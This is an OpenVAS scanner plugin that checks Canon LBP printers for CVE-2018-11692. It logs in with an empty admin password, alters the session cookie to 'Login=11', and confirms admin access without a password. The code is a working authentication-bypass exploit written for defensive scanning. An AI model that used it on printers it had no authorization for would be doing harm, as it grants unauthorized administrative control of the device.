###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_canon_printers_auth_bypass.nasl 13590 2019-02-12 02:34:37Z ckuersteiner $
#
# Canon Printers Authentication Bypass Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113207");
  script_version("$Revision: 13590 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 03:34:37 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2018-06-06 13:10:45 +0200 (Wed, 06 Jun 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  script_cve_id("CVE-2018-11692");

  script_name("Canon Printers Authentication Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_canon_printers_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("canon_printer_model");

  script_tag(name:"summary", value:"Canon Printers LBP6650, LBP3370, LBP3460 and LBP7550C
  are prone to an authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to bypass administrator authentication.");

  script_tag(name:"insight", value:"The authentication is handled by a cookie, which can be modified.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to gain
  administrative control over the target system.");

  script_tag(name:"affected", value:"Canon Printers LBP6650, LBP3370, LBP3460 and LBP7550C.");

  script_tag(name:"solution", value:"The vendor reportedly responded that this issue occurs when a customer keeps
the default settings without using the countermeasures and best practices shown in the documentation.");

  script_xref(name:"URL", value:"https://gist.github.com/huykha/2dfbe97810e96a05e67359fd9e7cc9ff");

  exit(0);
}

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );
include( "misc_func.inc" );

if( ! model = tolower ( get_kb_item( "canon_printer_model" ) ) ) exit( 0 );

CPE = "cpe:/h:canon:" + model;
if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );

affected = make_list( "lbp6650", "lbp3370", "lbp3460", "lbp7750c" );

if( ! in_array( search: model, array: affected ) ) exit( 0 );
login_data = "Action=LOGIN&ErrDetail=&Lang=1&Language=1&login_mode=user&admin_password=&user_name=";
login_headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );
req = http_post_req( port: port, url: "/tlogin.cgi", data: login_data,
                     accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                     add_headers: login_headers );
res = http_keepalive_send_recv( port: port, data: req );

if( egrep( string: res, pattern: 'Set-Cookie', icase: TRUE ) ) {
  cookie_match = eregmatch( string: res, pattern: '[Ss]et-[Cc]ookie: ?[Cc]ookie[Ii][Dd]=([^\r\n]+)' );
  if( isnull( cookie_match[1] ) ) exit( 0 );
  cookie = cookie_match[1];

  cookie_header = make_array( "Cookie", "CookieID=" + cookie + "; Login=11" );
  req = http_get_req( port: port, url: "/frame.cgi?page=DevInfoSetDev", add_headers: cookie_header, accept_header: "*/*;q=0.8" );
  res = http_keepalive_send_recv( data: req, port: port );
  if( 'switch("DevInfoSetDev")' >< res ) {
    report = "It was possible to acquire administrative privileges without a password.";
    security_message( data: report, port: port );
    exit( 0 );
  }
}

exit( 99 );
